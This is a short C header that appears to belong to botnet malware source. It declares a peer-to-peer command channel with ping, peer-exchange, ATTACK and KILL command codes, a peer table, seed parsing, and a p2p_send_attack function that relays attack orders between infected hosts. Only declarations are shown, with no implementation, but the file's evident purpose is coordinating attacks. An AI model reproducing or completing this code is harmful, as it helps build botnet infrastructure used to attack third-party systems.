#ifndef _P2P_H
#define _P2P_H

#define P2P_PORT 49152
#define P2P_MAX_PEERS 256
#define P2P_CMD_PING 0x01
#define P2P_CMD_PONG 0x02
#define P2P_CMD_PEERS 0x03
#define P2P_CMD_ATTACK 0x10
#define P2P_CMD_KILL 0x11

struct p2p_peer {
    ipv4_t addr;
    port_t port;
    time_t last_seen;
    uint8_t failures;
};

void p2p_init(void);
void p2p_start(void);
void p2p_maintain(void);
void p2p_broadcast(uint8_t *buf, int len);
void p2p_send_attack(uint8_t *buf, int len);
void p2p_add_peer(ipv4_t addr, port_t port);
void p2p_parse_seeds(void);

#endif
